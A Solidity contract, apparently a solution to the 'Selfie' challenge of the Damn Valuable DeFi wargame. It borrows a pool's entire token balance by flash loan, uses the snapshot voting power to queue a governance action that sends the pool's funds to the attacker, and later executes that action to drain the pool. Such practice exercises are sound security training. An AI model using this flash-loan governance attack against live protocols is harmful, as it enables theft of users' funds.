// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SelfiePool.sol";
import "../DamnValuableTokenSnapshot.sol";

/**
 * @title SelfiePoolAttacker
 * @author MJ
 * @notice Basic flash loan attack on SelfiePool via Governance Exploit.
 */
contract SelfiePoolAttacker is IERC3156FlashBorrower {
    SelfiePool immutable public selfiePool;
    DamnValuableTokenSnapshot immutable public token;
    ISimpleGovernance immutable public dao;

    uint256 lastActionId;

    constructor(address _selfiePool, address _daoAddress) {
      selfiePool = SelfiePool(_selfiePool);
      token = DamnValuableTokenSnapshot(address(SelfiePool(_selfiePool).token()));
      dao = ISimpleGovernance(_daoAddress);
    }

    /**
     * @notice Receives the flash loaned funds and queues a governance action to drain the funds from the SelfiePool.
     */
    function onFlashLoan(
        address initiator,
        address,
        uint256 amount,
        uint256,
        bytes calldata) 
      external override returns (bytes32) {
        token.snapshot();
        lastActionId = dao.queueAction(address(selfiePool), 0, abi.encodeWithSignature("emergencyExit(address)", initiator));
        token.increaseAllowance(address(selfiePool), amount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
      }

    /**
     * @notice Prepares a governance attack by borrowing funds from the SelfiePool
     * and queueing a governance action to drain the funds from the said pool.
     */
    function prepareAttack() external {
        selfiePool.flashLoan((this), address(token), token.balanceOf(address(selfiePool)), "");
    }

    /**
     * @notice Drains the funds from the SelfiePool to the attacker's address.
     * @dev This function can only be called after prepareAttack().
     * @dev This function can only be called 2 days after queuing the governance action.
     */
    function drainFunds() external {
        if(lastActionId == 0) revert ("No actionId"); 
        dao.executeAction(lastActionId);
        // Withdraw all funds back to caller
        token.transfer(msg.sender, token.balanceOf(address(this)));
    }
}